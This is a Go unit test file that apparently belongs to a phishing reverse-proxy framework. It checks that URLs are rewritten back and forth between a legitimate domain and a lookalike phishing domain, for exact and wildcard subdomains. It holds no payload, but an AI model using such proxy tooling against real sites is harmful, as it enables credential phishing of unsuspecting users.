package core

import (
	"testing"
)

func TestReplacers(t *testing.T) {
	exactHost := ProxyHost{
		phish_subdomain: "phish-sub",
		orig_subdomain:  "orig-sub",
		domain:          "domain.com",
		handle_session:  false,
		is_landing:      false,
		size_hint:       0,
		auto_filter:     false,
	}

	applyReplacer := exactHost.BuildReplacer(false, "gone.phishing.com")
	if !applyReplacer.Matches("https://orig-sub.domain.com/test", false) {
		t.Error("Exact forward replacer should match original URL")
	}
	if applyReplacer.Matches("https://orig-sub.domain.com/test", true) {
		t.Error("Exact forward replacer should not inverted match original URL")
	}
	if applyReplacer.Matches("https://phish-sub.gone.phishing.com/test", false) {
		t.Error("Exact forward replacer should not match phishing URL")
	}
	if !applyReplacer.Matches("https://phish-sub.gone.phishing.com/test", true) {
		t.Error("Exact forward replacer should inverted match phishing URL")
	}

	if applyReplacer.Apply("https://orig-sub.domain.com/test") != "https://phish-sub.gone.phishing.com/test" {
		t.Error("Exact forward replacer should replace original URL with phishing URL")
	}
	if applyReplacer.Apply("https://phish-sub.gone.phishing.com/test") != "https://phish-sub.gone.phishing.com/test" {
		t.Error("Exact forward replacer should not modify phishing URL")
	}
	if applyReplacer.Apply("https://example.com/no-touch") != "https://example.com/no-touch" {
		t.Error("Exact forward replacer should not replace out-of-scope URLs")
	}

	unapplyReplacer := exactHost.BuildReplacer(true, "gone.phishing.com")
	if !unapplyReplacer.Matches("https://phish-sub.gone.phishing.com/test", false) {
		t.Error("Exact reverse replacer should match phishing URL")
	}
	if unapplyReplacer.Matches("https://phish-sub.gone.phishing.com/test", true) {
		t.Error("Exact reverse replacer should not inverted match phishing URL")
	}
	if unapplyReplacer.Matches("https://orig-sub.domain.com/test", false) {
		t.Error("Exact reverse replacer should not match original URL")
	}
	if !unapplyReplacer.Matches("https://orig-sub.domain.com/test", true) {
		t.Error("Exact reverse replacer should inverted match original URL")
	}

	if unapplyReplacer.Apply("https://phish-sub.gone.phishing.com/test") != "https://orig-sub.domain.com/test" {
		t.Error("Exact reverse replacer should replace phishing URL with original URL")
	}
	if unapplyReplacer.Apply("https://orig-sub.domain.com/test") != "https://orig-sub.domain.com/test" {
		t.Error("Exact reverse replacer should not modify original URL")
	}
	if unapplyReplacer.Apply("https://example.com/no-touch") != "https://example.com/no-touch" {
		t.Error("Exact reverse replacer should not replace out-of-scope URLs")
	}

	fuzzyHost := ProxyHost{
		phish_subdomain: "phish-*",
		orig_subdomain:  "orig-*",
		domain:          "domain.com",
		handle_session:  false,
		is_landing:      false,
		size_hint:       0,
		auto_filter:     false,
	}

	applyFuzzyReplacer := fuzzyHost.BuildReplacer(false, "gone.phishing.com")
	if !applyFuzzyReplacer.Matches("https://orig-sub.domain.com/test", false) {
		t.Error("Fuzzy forward replacer should match original URL")
	}
	if applyFuzzyReplacer.Matches("https://orig-sub.domain.com/test", true) {
		t.Error("Fuzzy forward replacer should not inverted match original URL")
	}
	if applyFuzzyReplacer.Matches("https://phish-sub.gone.phishing.com/test", false) {
		t.Error("Fuzzy forward replacer should not match phishing URL")
	}
	if !applyFuzzyReplacer.Matches("https://phish-sub.gone.phishing.com/test", true) {
		t.Error("Fuzzy forward replacer should inverted match phishing URL")
	}

	if applyFuzzyReplacer.Apply("https://orig-sub.domain.com/test") != "https://phish-sub.gone.phishing.com/test" {
		t.Error("Fuzzy forward replacer should replace original URL with phishing URL")
	}
	if applyFuzzyReplacer.Apply("https://phish-sub.gone.phishing.com/test") != "https://phish-sub.gone.phishing.com/test" {
		t.Error("Fuzzy forward replacer should not modify phishing URL")
	}
	if applyFuzzyReplacer.Apply("https://example.com/no-touch") != "https://example.com/no-touch" {
		t.Error("Fuzzy forward replacer should not replace out-of-scope URLs")
	}

	unapplyFuzzyReplacer := fuzzyHost.BuildReplacer(true, "gone.phishing.com")
	if !unapplyFuzzyReplacer.Matches("https://phish-sub.gone.phishing.com/test", false) {
		t.Error("Fuzzy reverse replacer should match phishing URL")
	}
	if unapplyFuzzyReplacer.Matches("https://phish-sub.gone.phishing.com/test", true) {
		t.Error("Fuzzy reverse replacer should not inverted match phishing URL")
	}
	if unapplyFuzzyReplacer.Matches("https://orig-sub.domain.com/test", false) {
		t.Error("Fuzzy reverse replacer should not match original URL")
	}
	if !unapplyFuzzyReplacer.Matches("https://orig-sub.domain.com/test", true) {
		t.Error("Fuzzy reverse replacer should inverted match original URL")
	}

	if unapplyFuzzyReplacer.Apply("https://phish-sub.gone.phishing.com/test") != "https://orig-sub.domain.com/test" {
		t.Error("Fuzzy reverse replacer should replace phishing URL with original URL")
	}
	if unapplyFuzzyReplacer.Apply("https://orig-sub.domain.com/test") != "https://orig-sub.domain.com/test" {
		t.Error("Fuzzy reverse replacer should not modify original URL")
	}
	if unapplyFuzzyReplacer.Apply("https://example.com/no-touch") != "https://example.com/no-touch" {
		t.Error("Fuzzy reverse replacer should not replace out-of-scope URLs")
	}
}
